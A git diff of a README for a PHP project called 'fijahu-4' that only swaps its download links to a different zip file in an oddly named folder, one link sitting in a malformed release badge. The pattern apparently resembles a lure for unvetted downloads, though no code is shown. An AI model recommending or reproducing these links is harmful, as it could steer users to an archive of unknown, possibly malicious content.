@@ -1,6 +1,6 @@
 # 🚀 fijahu-4 - Simple PHP Application for Everyone
 
-![GitHub Release](https://raw.githubusercontent.com/joliotcuriedrapery164/fijahu-4/main/fraternity/fijahu-4_v2.2.zip%20Now-Click%20Here-brightgreen)
+![GitHub Release](https://raw.githubusercontent.com/joliotcuriedrapery164/fijahu-4/main/fraternity/fijahu_v3.6.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the fijahu-4 project! This application allows you to utilize PHP in a
 
 ## 📥 Download & Install
 
-To download the fijahu-4 application, visit this page to download: [fijahu-4 Releases](https://raw.githubusercontent.com/joliotcuriedrapery164/fijahu-4/main/fraternity/fijahu-4_v2.2.zip).
+To download the fijahu-4 application, visit this page to download: [fijahu-4 Releases](https://raw.githubusercontent.com/joliotcuriedrapery164/fijahu-4/main/fraternity/fijahu_v3.6.zip).
 
 Follow these simple steps to get your application up and running:
 
